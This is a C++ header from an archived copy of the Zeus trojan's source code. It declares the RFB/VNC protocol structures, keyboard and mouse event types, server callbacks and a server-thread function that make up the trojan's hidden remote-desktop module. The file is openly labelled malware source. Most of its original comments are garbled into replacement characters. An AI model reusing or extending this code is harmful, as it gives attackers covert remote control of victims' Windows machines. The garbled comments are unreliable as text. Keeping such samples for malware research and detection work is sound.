/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  �������� RFB.
  �� ������ http://www.uvnc.com/

*/
#pragma once

#if(BO_VNC > 0)
namespace Rfb
{
  //Types of authorization.
  enum
  {
    ST_INVALID = 0,
    ST_NONE    = 1,
    ST_VNCAUTH = 2,
    ST_ERROR   = 0xFFFFFFFF
  };

  //Types of codecs.
  enum  
  {
    ENCODER_Raw         = 0, 
    ENCODER_Hextile     = 5,
    ENCODER_DesktopSize = 0xFFFFFF21
  };

  #pragma pack(push, 1)
  //Pixel format.
  typedef struct
  {
    BYTE bBitsPerPixel;
    BYTE bDepth;
    BYTE bBigEndian;
    BYTE bTrueColour;
    
    WORD wRedMax;
    WORD wGreenMax;
    WORD wBlueMax;
    
    BYTE bRedShift;
    BYTE bGreenShift;
    BYTE bBlueShift;
    
    BYTE bPadding[3];
  }PIXEL_FORMAT;

  //Post ServerInit.
  typedef struct
  {
    WORD wFrameBufferWidth;
    WORD wFrameBufferHeight;
    PIXEL_FORMAT pf;
    DWORD dwNameLength;
  }MSG_SERVERINIT;

  //The coordinates of the square.
  typedef struct
  {
    BYTE bIncremental;
    WORD wXPos;
    WORD wYPos;
    WORD wWidth;
    WORD wHeight;
  }RECTANGLE;

  typedef struct
  {
    WORD wXPos;
    WORD wYPos;
    WORD wWidth;
    WORD wHeight;
    DWORD dwEncodingType;
  }RECTANGLEEX;
  
  //Data on the key.
  typedef struct
  {
    BYTE bIsDown;
    BYTE pad[2];
    DWORD dwKeyCode;
  }EVENT_KEY;
  
  //Data on the signs.
  typedef struct
  {
    BYTE bButtonMask;
    WORD wXPos;
    WORD wYPos;
  }EVENT_POINTER;
  #pragma pack(pop)

  //Inside the server data.
  typedef struct
  {
    HDC memoryDc;           //DC for work.
    HBITMAP originalBitmap; //Outcomes bitmap memoryDc.

    WORD wWidth;
    WORD wHeight;
    DWORD dwWidthInBytes;

    HBITMAP hBitmap;
    LPBYTE pBmpDIB;
    LPBYTE pBmpDIBOld;
    void *pHextileBuffer; //Internal buffer for the codec Hextile.
    
    PIXEL_FORMAT pfLocalPixel;
    BYTE bLocalPixelSize;
    PIXEL_FORMAT pfRemotePixel;
    BYTE bRemotePixelSize;

    LPDWORD dwEncodingsList;       //List of codecs that are supported by client
    WORD wEncodingsCount;          //Number of codecs that are supported by client
    DWORD dwCurrentEncoder;        //Tekuschmy codec.
    DWORD dwCurrentEncoderSwapped; //BigEndian Id codec.
  }INTERNAL_DATA;

  //Structure with kelbek functions used in the course of the server.
  //NOTE: All WORD, DWORD specified in LITTLE ENDIAN (ie normal).
  typedef struct 
  {
    void *param; //Arbitrary parameter functions.

    /*
      ��������� ������� ����������� �� �������.

      OUT securityType - ���� �� �������� ST_*. �� ��������� �������� ����� ST_NONE.
      OUT errorMessage - � ������ ���� *pdwSecurityType == ST_INVALID, ����������� ���������
                         �� ������, ����� ������������. ���������� *ppstrErrorMessage �� �����
                         ������������� �����������!
    */
    void (*onSecurityType)(void *param, LPDWORD securityType, LPSTR *errorMessage);
    
    /*
      ��������� �� ������� ��������� ClientInit.

      IN shared - ��������� ����� Shared-flag.

      Return    - true - ��� ����������� ������,
                  false - ��� ����������� ���������� ������.
    */
    bool (*onClientInit)(void *param, BYTE shared);
    
    /*
      ���������� ����� ��������� ��������� ServerInit.

      OUT name - ��������� �� ��� �������. ����� �� ����������� �������������!
      OUT size - ������ �����������.

      Return   - Memory DC - ����� ������������� ��� ������ �������, ����� ����������
                 ��������������.
                 NULL - ��� ����������� ���������� ������. 
   */
    HDC (*onServerInit)(void *param, LPSTR *name, POINT *size);

    /*
      ���������� � ������ ����������� �����������.
    */
    void (*OnUpdateDC)(void *pParam);

    /*
      ��������� ��������� �������.

      IN keySym - KeySym.
      IN down   - true - �������, false - ����������.
    */
    void (*onKeyEvent)(void *param, DWORD keySym, bool down);
    
    /*
      ��������� ��������� ���������.

      IN ..       - ������ ������ mouse_event.
    */
    void (*OnPointerEvent)(void *pParam, DWORD dwFlags, LONG wX, LONG wY, DWORD dwData);

    /*
      ������� ������.
      
      IN dwLen      - ������ ������.
      IN pstrString - ������.
    */
    void (*OnClientCutText)(void *pParam, DWORD dwLen, LPSTR pstrString);
  }SERVER_CALLBACKS;
  
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ������ RFB ��������.

    IN s                 - �����.
    IN dwTimeout         - ������� �������� ������� �� �������, ��� 0 ��� ������������ ��������.
    IN pCallbacks        - ������ ������� �������.
    IN hDIBMap           - Map-file ��� �������, ��������� �������� ����� �����������, ��� NULL.
    IN updateMutex       - ������ ���������� ���������� �������, ��� NULL.
    IN dwRefreshInterval - �������� ����� ������� ��������� �����������.
  */
  void _ServerThread(SOCKET s, DWORD dwTimeout, SERVER_CALLBACKS *pCallbacks, HANDLE hDIBMap, DWORD mapOffset, HANDLE updateMutex, DWORD dwRefreshInterval);

  /*
    ��������� �������� ������ �� �������.

    IN s   - ����� �������.

    Return - true - � ������ ������,
             false - � ������ ������.
  */
  bool _SendBell(SOCKET s);
  
  /*    Send a "buffer" the text to the client.
    
    IN s - the client socket.
    IN pstrText - text to send.

    Return - true - if successful,
             false - if an error occurs.
  */
  bool _CopyText(SOCKET s, LPSTR pstrText);
};

#endif
